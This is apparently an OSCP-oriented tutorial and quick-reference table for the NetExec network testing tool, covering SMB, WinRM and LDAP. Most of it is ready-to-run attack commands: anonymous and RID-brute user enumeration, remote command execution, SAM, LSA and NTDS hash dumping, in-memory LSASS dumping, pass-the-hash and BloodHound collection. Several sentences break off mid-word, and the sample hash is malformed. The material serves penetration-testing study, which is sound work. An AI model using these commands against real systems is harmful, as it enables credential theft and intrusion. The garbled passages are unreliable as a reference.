NetExec - Swiss Army Knife for Network Authentication Testing

NetExec (nxc) is the maintained fork of CrackMapExec. Most people associate it with Active Directory, but it is equally useful on non-AD assessments - any time you hit SMB or WinRM, NetExec belongs in your workflow.

---
Why NetExec

The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.

---
SMB

Credential Validation

nxc smb 10.10.10.10 -u user -p password

The output tells you immediately what you have. [+] means valid credentials. (Pwned!) next to the result means the account has local admin rights on that machine - you can dump hashes without any further escalation.

Share Enumeration

# anonymous / guest access
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u guest -p ''

# with valid credentials
nxc smb 10.10.10.10 -u user -p password --shares

Anonymous and guest access to SMB is worth testing on every assessment - including non-AD ones. When guest auth is enabled, check the description field in user enumeration - developers and sysadmins occasionally store

nxc smb 10.10.10.10 -u '' -p '' --users

User Enumeration

nxc smb 10.10.10.10 -u user -p password --users
nxc smb 10.10.10.10 -u user -p password --rid-brute

--rid-brute does not require credentials if guest auth is enabled. It cycles through RIDs and resolves them to account names - useful for building a
username list before you have any valid credentials.

Remote Command Execution

nxc smb 10.10.10.10 -u user -p password -x whoami      # cmd
nxc smb 10.10.10.10 -u user -p password -X whoami      # powershell

Requires local admin. Use -x for cmd.exe commands and -X for PowerShell.

Credential and Hash Dumping

Once you have local admin rights, NetExec handles remote dumps without touching disk on the target - no Mimikatz upload required:

# SAM database - local account hashes
nxc smb 10.10.10.10 -u user -p password --sam

# LSA secrets - service account credentials, cached domain cre
nxc smb 10.10.10.10 -u user -p password --lsa

# NTDS.dit - all domain account hashes (requires DC access)
nxc smb 10.10.10.10 -u user -p password --ntds

# In-memory credential dumping via lsassy (no binary upload)
nxc smb 10.10.10.10 -u user -p password -M lsassy

# Alternative in-memory dump - useful when lsassy is blocked
nxc smb 10.10.10.10 -u user -p password -M nanodump

# See who is currently logged in
nxc smb 10.10.10.10 -u user -p password --loggedon-users

--sam and --lsa are the fastest options. lsassy is more powerful but noisier. On OSCP, --sam first - it is fast and gets you local hashes immediately for
pass-the-hash or cracking.

Pass the Hash

All SMB commands accept NT hashes instead of a password:

nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b43c59d7e0c089c0

---
WinRM

nxc winrm 10.10.10.10 -u user -p password
nxc winrm 10.10.10.10 -u user -p password -x whoami

Same output convention - (Pwned!) means the account can authenet a shell via Evil-WinRM.

---
LDAP

# anonymous bind
nxc ldap 10.10.10.10 -u '' -p ''

# user enumeration with valid creds
nxc ldap 10.10.10.10 -u user -p password --users

# BloodHound data collection
nxc ldap 10.10.10.10 -u user -p password --bloodhound --collec

LDAP anonymous bind is a quick win on misconfigured domain conoups, and sometimes password policy without any credentials.--bloodhound replaces SharpHound for collection when you want to avoid uploading a binary to the target.

---
Quick Reference

┌──────────┬───────────────────┬──────────────────────────────┐
│ Protocol │     Use Case      │                          Command                          │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Check local admin │ nxc smb IP -u user -p pass                                │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Anonymous access  │ nxc smb IP -u '' -p ''                                    │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ List shares       │ nxc smb IP -u user -p pass --shares                       │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Enumerate users   │ nxc smb IP -u user -p pass --users                        │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ RID brute         │ nxc smb IP -u '' -p '' --rid-brute                        │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Dump SAM          │ nxc smb IP -u user -p pass --sam                          │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Dump LSA          │ nxc smb IP -u user -p pass --lsa                          │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ In-memory dump    │ nxc smb IP -u user -p pass -M lsassy                      │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ All domain hashes │ nxc smb IP -u user -p pass --ntds                         │
├──────────┼───────────────────┼──────────────────────────────┤
│ SMB      │ Execute command   │ nxc smb IP -u user -p pass -x cmd                         │
├──────────┼───────────────────┼──────────────────────────────┤
│ WinRM    │ Check access      │ nxc winrm IP -u user -p pass                              │
├──────────┼───────────────────┼──────────────────────────────┤
│ LDAP     │ Anonymous bind    │ nxc ldap IP -u '' -p ''                                   │
├──────────┼───────────────────┼──────────────────────────────┤
│ LDAP     │ BloodHound        │ nxc ldap IP -u user -p pass --bloodhound --collection All │
└──────────┴───────────────────┴──────────────────────────────┘
